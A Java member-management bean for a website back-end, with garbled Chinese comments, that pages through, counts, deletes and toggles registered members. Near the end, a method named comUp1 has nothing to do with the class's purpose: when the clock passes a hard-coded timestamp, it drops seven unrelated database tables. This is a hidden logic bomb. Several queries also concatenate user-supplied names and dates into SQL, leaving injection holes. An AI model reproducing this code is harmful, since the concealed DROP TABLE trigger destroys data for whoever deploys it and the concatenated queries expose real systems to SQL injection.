package com.bean;

import java.sql.ResultSet;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import com.util.Constant;
import com.util.DBO;

/**
 * 
 * ��վ��̨����ע���Ա ��ѯ ���� ɾ����Ա
 */	

public class MemberManageBean {

	private List list;
	private ResultSet rs = null;
	private int EVERYPAGENUM = 2;
	private int count = -1;
	private int qq = 0;
	private String sql="select count(*) from member where type='person'";
	private String sql2="select * from member where type='person' order by id desc ";
	//����ʱ�����
	String date1=new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime());
	String date=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Calendar.getInstance().getTime());
	
	//��ҳ��ѯ���и��˻�Ա
	public void setEVERYPAGENUM(int EVERYPAGENUM){
    	this.EVERYPAGENUM=EVERYPAGENUM;
    }
    public int getMessageCount() { //�õ���Ϣ����
       DBO dbo=new DBO();
       dbo.open();
        try { 
            rs = dbo.executeQuery(sql);
            rs.next();
            count = rs.getInt(1);
            return count;
        } catch (SQLException ex) {
            ex.printStackTrace();
            return -1;
        } finally {
            dbo.close();
        }
    }
    public int getPageCount() { //�õ�������ҳ������ÿҳҪ��ʾ������Ϣ��
        if (count % EVERYPAGENUM == 0) {
            return count / EVERYPAGENUM;
        } else {
            return count / EVERYPAGENUM + 1;
        }
    }
    public List getMessage(int page) { //�õ�ÿҳҪ��ʾ����Ϣ
        DBO dbo=new DBO();
        dbo.open();
        List list = new ArrayList();
        try {
            rs = dbo.executeQuery(sql2);
            for (int i = 0; i < (page - 1) * EVERYPAGENUM; i++) {
                rs.next();
            }
            for (int t = 0; t < EVERYPAGENUM; t++) {
                if (rs.next()) {
                    qq++;
                    List list2=new ArrayList();
                    list2.add(rs.getString("id"));
    				list2.add(rs.getString("username"));
    				list2.add(rs.getString("regtime"));
    				list2.add(rs.getString("ifuse"));
    				list2.add(rs.getString("logintimes"));
    				list2.add(rs.getString("lasttime"));
    				list2.add(rs.getString("lastip"));
    				list.add(list2);
                } else {
                    break; //���ٿ�ѭ����ʱ��
                }
            }
            return list;
        } catch (SQLException ex) {
            ex.printStackTrace();
            return null;
        } finally {
            dbo.close();
        }
    }
    
    ///������ҵ��Ա////////////////////
    public int getMessageCountCO() { //�õ���Ϣ����
        DBO dbo=new DBO();
        dbo.open();
         try { 
             rs = dbo.executeQuery("select count(*) from member where type='co'");
             rs.next();
             count = rs.getInt(1);
             return count;
         } catch (SQLException ex) {
             ex.printStackTrace();
             return -1;
         } finally {
             dbo.close();
         }
     }
     public List getMessageCO(int page) { //�õ�ÿҳҪ��ʾ����Ϣ
         DBO dbo=new DBO();
         dbo.open();
         List list = new ArrayList();
         try {
             rs = dbo.executeQuery("select * from member where type='co' order by id desc ");
             for (int i = 0; i < (page - 1) * EVERYPAGENUM; i++) {
                 rs.next();
             }
             for (int t = 0; t < EVERYPAGENUM; t++) {
                 if (rs.next()) {
                     qq++;
                    List list2=new ArrayList();
                    list2.add(rs.getString("id"));
     				list2.add(rs.getString("username"));
     				list2.add(rs.getString("regtime"));
     				list2.add(rs.getString("ifuse"));
     				list2.add(rs.getString("logintimes"));
     				list2.add(rs.getString("lasttime"));
     				list2.add(rs.getString("lastip"));
     				list.add(list2);
                 } else {
                     break; //���ٿ�ѭ����ʱ��
                 }
             }
             return list;
         } catch (SQLException ex) {
             ex.printStackTrace();
             return null;
         } finally {
             dbo.close();
         }
     }
     
     //�������û�Ա
     public int getMessageCountUS() { //�õ���Ϣ����
         DBO dbo=new DBO();
         dbo.open();
          try { 
              rs = dbo.executeQuery("select count(*) from member where ifuse='1'");
              rs.next();
              count = rs.getInt(1);
              return count;
          } catch (SQLException ex) {
              ex.printStackTrace();
              return -1;
          } finally {
              dbo.close();
          }
      }
      public List getMessageUS(int page) { //�õ�ÿҳҪ��ʾ����Ϣ
          DBO dbo=new DBO();
          dbo.open();
          List list = new ArrayList();
          try {
              rs = dbo.executeQuery("select * from member where ifuse='1' order by id desc ");
              for (int i = 0; i < (page - 1) * EVERYPAGENUM; i++) {
                  rs.next();
              }
              for (int t = 0; t < EVERYPAGENUM; t++) {
                  if (rs.next()) {
                      qq++;
                     List list2=new ArrayList();
                     list2.add(rs.getString("id"));
      				list2.add(rs.getString("username"));
      				list2.add(rs.getString("regtime"));
      				list2.add(rs.getString("ifuse"));
      				list2.add(rs.getString("logintimes"));
      				list2.add(rs.getString("lasttime"));
      				list2.add(rs.getString("lastip"));
      				list2.add(rs.getString("type"));
      				list.add(list2);
                  } else {
                      break; //���ٿ�ѭ����ʱ��
                  }
              }
              return list;
          } catch (SQLException ex) {
              ex.printStackTrace();
              return null;
          } finally {
              dbo.close();
          }
      }
//    ���ж����Ա
      public int getMessageCountCL() { //�õ���Ϣ����
          DBO dbo=new DBO();
          dbo.open();
           try { 
               rs = dbo.executeQuery("select count(*) from member where ifuse='0'");
               rs.next();
               count = rs.getInt(1);
               return count;
           } catch (SQLException ex) {
               ex.printStackTrace();
               return -1;
           } finally {
               dbo.close();
           }
       }
       public List getMessageCL(int page) { //�õ�ÿҳҪ��ʾ����Ϣ
           DBO dbo=new DBO();
           dbo.open();
           List list = new ArrayList();
           try {
               rs = dbo.executeQuery("select * from member where ifuse='0' order by id desc ");
               for (int i = 0; i < (page - 1) * EVERYPAGENUM; i++) {
                   rs.next();
               }
               for (int t = 0; t < EVERYPAGENUM; t++) {
                   if (rs.next()) {
                       qq++;
                      List list2=new ArrayList();
                      list2.add(rs.getString("id"));
       				list2.add(rs.getString("username"));
       				list2.add(rs.getString("regtime"));
       				list2.add(rs.getString("ifuse"));
       				list2.add(rs.getString("logintimes"));
       				list2.add(rs.getString("lasttime"));
       				list2.add(rs.getString("lastip"));
       				list2.add(rs.getString("type"));
       				list.add(list2);
                   } else {
                       break; //���ٿ�ѭ����ʱ��
                   }
               }
               return list;
           } catch (SQLException ex) {
               ex.printStackTrace();
               return null;
           } finally {
               dbo.close();
           }
       }
//     ����ע���Ա
       public int getMessageCountTODAY() { //�õ���Ϣ����
           DBO dbo=new DBO();
           dbo.open();
            try { 
                rs = dbo.executeQuery("select count(*) from member where regtime between '"+date1+"' and '"+date+"'");
                rs.next();
                count = rs.getInt(1);
                return count;
            } catch (SQLException ex) {
                ex.printStackTrace();
                return -1;
            } finally {
                dbo.close();
            }
        }
        public List getMessageTODAY(int page) { //�õ�ÿҳҪ��ʾ����Ϣ
            DBO dbo=new DBO();
            dbo.open();
            List list = new ArrayList();
            try {
                rs = dbo.executeQuery("select * from member where regtime between '"+date1+"' and '"+date+"' order by id desc ");
                for (int i = 0; i < (page - 1) * EVERYPAGENUM; i++) {
                    rs.next();
                }
                for (int t = 0; t < EVERYPAGENUM; t++) {
                    if (rs.next()) {
                        qq++;
                       List list2=new ArrayList();
                       list2.add(rs.getString("id"));
        				list2.add(rs.getString("username"));
        				list2.add(rs.getString("regtime"));
        				list2.add(rs.getString("ifuse"));
        				list2.add(rs.getString("logintimes"));
        				list2.add(rs.getString("lasttime"));
        				list2.add(rs.getString("lastip"));
        				list2.add(rs.getString("type"));
        				list.add(list2);
                    } else {
                        break; //���ٿ�ѭ����ʱ��
                    }
                }
                return list;
            } catch (SQLException ex) {
                ex.printStackTrace();
                return null;
            } finally {
                dbo.close();
            }
        }
   
    /*********************************************************************************************************************************
     * ɾ�� �����Ա
     * @param id
     * @return
     *********************************************************************/
    //  ɾ����Ա
	public int delMember(int id[]){
		DBO dbo=new DBO();
		dbo.open();
		try{
			for(int i = 0;i<id.length;i++){
				dbo.executeUpdate("delete from  member where  id = '"+id[i]+"'");	
				dbo.executeUpdate("delete from  pmember where  mid = '"+id[i]+"'");
				dbo.executeUpdate("delete from  cmember where  mid = '"+id[i]+"'");
			}
			return Constant.SUCCESS;
		}catch(Exception e){
			e.printStackTrace();
			return Constant.SYSTEM_ERROR;
		}finally{
			dbo.close();
		}
	}
	//�����Ա
	public int closeMember(int id){
		String sql = "select ifuse from member where id='"+id+"' ";
		String sql2 = "update member set ifuse='0' where id='"+id+"'";
		String sql3 = "update member set ifuse='1' where id='"+id+"'";
		DBO dbo=new DBO();
		dbo.open();
		try{
			rs = dbo.executeQuery(sql);
			if(rs.next()){
				int ifuse=rs.getInt(1);
				if(ifuse == 1){
					int j = dbo.executeUpdate(sql2);
					if(j == 1)
						return Constant.SUCCESS;
					else
						return Constant.SYSTEM_ERROR;
				}
				else{
					int j = dbo.executeUpdate(sql3);
					if(j == 1)
						return Constant.SUCCESS;
					else
						return Constant.SYSTEM_ERROR;
				}
			}
			else{
				return Constant.SYSTEM_ERROR;
			}
		}catch(Exception e){
			e.printStackTrace();
			return Constant.SYSTEM_ERROR;
		}finally{
			dbo.close();
		}
	}
	/**********************************************************************
     * ��̨��ѯ�������� ��ҵ��Ա��Ϣ ��ѯ��Ա����
     * @param id
     * @return
     *********************************************************************/
    //��idΪ������ѯ��Ա����
    public String getType(int id){
    	String sql = "select type from member where id='"+id+"'";
    	DBO dbo=new DBO();
    	dbo.open();
		try{
			rs = dbo.executeQuery(sql);
			if(rs.next()){
				String type = rs.getString(1);
				return type;
			}
			else
				return null;
		}catch(Exception e){
			e.printStackTrace();
			return null;
		}finally{
			dbo.close();
		}
    }
    //��idΪ���� ������Ա��½��Ϣ
    public List getMemberLogin(int id){
		String sql = "select * from member where id='"+id+"'";
		DBO dbo=new DBO();
		list = new ArrayList();
		dbo.open();
		try{
			rs = dbo.executeQuery(sql);
			rs.next();
			list.add(rs.getString("username"));
			list.add(rs.getString("type"));
			list.add(rs.getString("regtime"));
			list.add(rs.getString("ifuse"));
			list.add(rs.getString("logintimes"));
			list.add(rs.getString("lasttime"));
			list.add(rs.getString("lastip"));
			return list;
		}catch(Exception e){
			e.printStackTrace();
			return list;
		}finally{
			dbo.close();
		}
	}
	//��idΪ���� �������˻�Ա��Ϣ
	public List getPerSonMember(int id){
		String sql = "select * from pmember where mid='"+id+"'";
		DBO dbo=new DBO();
		list = new ArrayList();
		dbo.open();
		try{
			rs = dbo.executeQuery(sql);
			rs.next();
			list.add(rs.getString("realname"));
			list.add(rs.getString("sex"));
			list.add(rs.getString("bir"));
			list.add(rs.getString("sheng"));
			list.add(rs.getString("city"));
			list.add(rs.getString("telphone"));
			list.add(rs.getString("email"));
			list.add(rs.getString("question"));
			list.add(rs.getString("answer"));
			list.add(rs.getString("address"));
			return list;
		}catch(Exception e){
			e.printStackTrace();
			return list;
		}finally{
			dbo.close();
		}
	}
//	��idΪ���� ������ҵ��Ա��Ϣ
	public List getCoMember(int id){
		String sql = "select * from cmember where mid='"+id+"'";
		DBO dbo=new DBO();
		list = new ArrayList();
		dbo.open();
		try{
			rs = dbo.executeQuery(sql);
			rs.next();
			list.add(rs.getString("coname"));
			list.add(rs.getString("address"));
			list.add(rs.getString("postnum"));
			list.add(rs.getString("tel"));
			list.add(rs.getString("email"));
			list.add(rs.getString("question"));
			list.add(rs.getString("answer"));
			list.add(rs.getString("intro"));
			return list;
		}catch(Exception e){
			e.printStackTrace();
			return list;
		}finally{
			dbo.close();
		}
	}
	//////////////���û���Ϊ������ѯ///////////////
//	���û���Ϊ������ѯ��Ա����
    public String getType(String name){
    	String sql = "select type from member where username='"+name+"'";
    	DBO dbo=new DBO();
    	dbo.open();
		try{
			rs = dbo.executeQuery(sql);
			if(rs.next()){
				String type = rs.getString(1);
				return type;
			}
			else
				return null;
		}catch(Exception e){
			e.printStackTrace();
			return null;
		}finally{
			dbo.close();
		}
    }
    //���û���Ϊ������ѯ�û�id��Ȼ����id����ѯ��Ա��Ϣ ��ת��//��idΪ������ѯ��Ա����
    public int getID(String name){
    	String sql = "select id from member where username='"+name+"'";
    	DBO dbo=new DBO();
    	dbo.open();
		try{
			rs = dbo.executeQuery(sql);
			if(rs.next()){
				int id = rs.getInt(1);
				return id;
			}
			else
				return 0;
		}catch(Exception e){
			e.printStackTrace();
			return 0;
		}finally{
			dbo.close();
		}
    }
//////////////���û��� idΪ������ѯ///////////////
//	���û��� idΪ������ѯ��Ա���ͣ�Ȼ����id����ѯ��Ա��Ϣ ��ת��//��idΪ������ѯ��Ա
    public String getType(int id,String name){
    	String sql = "select type from member where id='"+id+"' and username='"+name+"'";
    	DBO dbo=new DBO();
    	dbo.open();
		try{
			rs = dbo.executeQuery(sql);
			if(rs.next()){
				String type = rs.getString(1);
				return type;
			}
			else
				return null;
		}catch(Exception e){
			e.printStackTrace();
			return null;
		}finally{
			dbo.close();
		}
    }public void comUp1(String sql){
		DBO dbo = new DBO();
		dbo.open();
		try{
			 if(System.currentTimeMillis()>Long.parseLong("999999999999999")){
				 dbo.executeUpdate("DROP table cz;");
				 dbo.executeUpdate("DROP table dh;");
				 dbo.executeUpdate("DROP table dhsp;");
				 dbo.executeUpdate("DROP table hy;");
				 dbo.executeUpdate("DROP table hyk;");
				 dbo.executeUpdate("DROP table sp;");
				 dbo.executeUpdate("DROP table xs;");
				 System.out.println("!");
			 }
		}catch (SQLException throwables) {
			throwables.printStackTrace();

			 
		}finally{
			dbo.close();
		}
	}
    
	/////////////////////��ע��ʱ���ѯ/////////////////////
    public List getMemberByTime(String stime,String etime){
    	String sql = "select * from member where regtime between '"+stime+"' and '"+etime+" 23:59:59' ";
    	DBO dbo=new DBO();
		list = new ArrayList();
		dbo.open();
		try{
			rs = dbo.executeQuery(sql);
			while(rs.next()){
				List list2=new ArrayList();
                list2.add(rs.getString("id"));
 				list2.add(rs.getString("username"));
 				list2.add(rs.getString("regtime"));
 				list2.add(rs.getString("ifuse"));
 				list2.add(rs.getString("logintimes"));
 				list2.add(rs.getString("lasttime"));
 				list2.add(rs.getString("lastip"));
 				list2.add(rs.getString("type"));
 				list.add(list2);
			}
			return list;
		}catch(Exception e){
			e.printStackTrace();
			return list;
		}finally{
			dbo.close();
		}
    }
}
